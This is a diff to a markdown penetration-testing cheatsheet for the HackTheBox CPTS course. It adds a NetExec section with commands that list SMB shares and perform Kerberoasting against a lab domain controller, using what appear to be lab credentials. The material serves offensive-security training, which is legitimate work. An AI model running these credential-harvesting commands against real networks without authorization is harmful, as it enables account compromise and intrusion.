@@ -51,6 +51,7 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
     - [Hydra](#hydra)
 - [SQLMap](#sqlmap)
 - [bloodhound](#bloodhound)
+- [nxc](#nxc)
 - [Useful Resources](#useful-resources)
 
 
@@ -770,6 +771,18 @@ sudo neo4j console
 
 # run bloodhound
 bloodhound
+
+```
+## nxc
+
+```
+# list shares 
+nxc smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --shares
+
+# Kerberoasting 
+nxc ldap   dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'  --kerberoasting -
+
+
 
 ```
 ## Useful Resources 
